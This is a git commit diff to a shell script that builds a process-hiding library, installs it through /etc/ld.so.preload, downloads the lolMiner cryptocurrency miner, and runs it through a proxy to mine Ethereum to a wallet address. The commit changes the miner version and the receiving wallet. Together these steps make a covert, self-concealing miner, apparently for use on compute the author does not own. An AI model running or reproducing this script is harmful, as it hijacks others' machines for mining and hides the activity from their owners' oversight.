fa02d6d773c2a9619042df7ffa649e88e61f6bf2
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-05-29 12:41:31 +0200

    Update start_lol_ethermWs5.sh

--- start_lol_ethermWs5.sh
+++ start_lol_ethermWs5.sh
@@ -6,8 +6,8 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.26/lolMiner_v1.26_Lin64.tar.gz
-tar -xvzf lolMiner_v1.26_Lin64.tar.gz
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+tar -xvzf lolMiner_v1.29_Lin64.tar.gz
 rm .gitignore
-cd 1.26
-graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x52500352a37a06f0c085d58663e4eadbd7e9f684 --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
+cd 1.29
+graftcp ./lolMiner -a ETHASH --pool us1.ethermine.org:5555 --tls on --user 0x8CB8003E428D0Fd7693D22f576A212403728c64a --worker lolMiner --shortstats 30 --timeprint on --log on --ethstratum ETHPROXY --nocolor
